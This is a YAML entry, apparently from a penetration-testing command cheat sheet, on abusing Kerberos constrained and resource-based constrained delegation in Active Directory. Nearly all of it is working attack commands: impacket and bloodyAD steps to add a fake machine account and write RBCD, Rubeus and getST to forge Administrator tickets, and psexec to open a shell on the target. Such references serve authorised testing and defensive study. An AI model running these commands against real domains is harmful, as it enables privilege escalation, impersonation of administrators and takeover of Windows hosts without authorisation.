---
description: |
  Kerberos delegation abuse — exploit constrained and resource-based constrained delegation (RBCD) to impersonate users.
commands:
  - have: Credentials
    cmd: |
      # Find delegation settings
      impacket-findDelegation senshu.sh/sec_user:'P@ssw0rd' -dc-ip 10.10.10.27

      # --- Constrained Delegation ---
      .\Rubeus.exe s4u /user:sec_user /rc4:NTHASH /impersonateuser:Administrator /msdsspn:cifs/TARGET.senshu.sh /ptt

      # --- RBCD (need write access to msDS-AllowedToActOnBehalfOfOtherIdentity) ---
      # Create machine account + set RBCD + get ticket
      impacket-addcomputer senshu.sh/sec_user:'P@ssw0rd' -computer-name 'FAKE01$' -computer-pass 'FakePass123' -dc-ip 10.10.10.27
      impacket-rbcd senshu.sh/sec_user:'P@ssw0rd' -delegate-from 'FAKE01$' -delegate-to 'TARGET$' -dc-ip 10.10.10.27 -action write
      # or bloodyAD:
      bloodyAD -d senshu.sh -u sec_user -p 'P@ssw0rd' --host 10.10.10.27 add rbcd 'TARGET$' 'FAKE01$'
      impacket-getST senshu.sh/'FAKE01$':'FakePass123' -spn cifs/TARGET.senshu.sh -impersonate Administrator -dc-ip 10.10.10.27

      # Use the ticket
      export KRB5CCNAME=Administrator.ccache
      impacket-psexec senshu.sh/Administrator@TARGET.senshu.sh -k -no-pass
  - have: Shell
    cmd: |
      # RBCD from Windows
      Set-ADComputer TARGET -PrincipalsAllowedToDelegateToAccount FAKE01$
      .\Rubeus.exe s4u /user:FAKE01$ /rc4:NTHASH /impersonateuser:Administrator /msdsspn:cifs/TARGET.senshu.sh /ptt
phase:
  - Exploitation
target_os:
  - Windows
services:
  - Kerberos
  - LDAP
techniques:
  - Delegation_Abuse
references:
  - https://github.com/fortra/impacket
  - https://github.com/GhostPack/Rubeus
  - https://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/resource-based-constrained-delegation.html
---
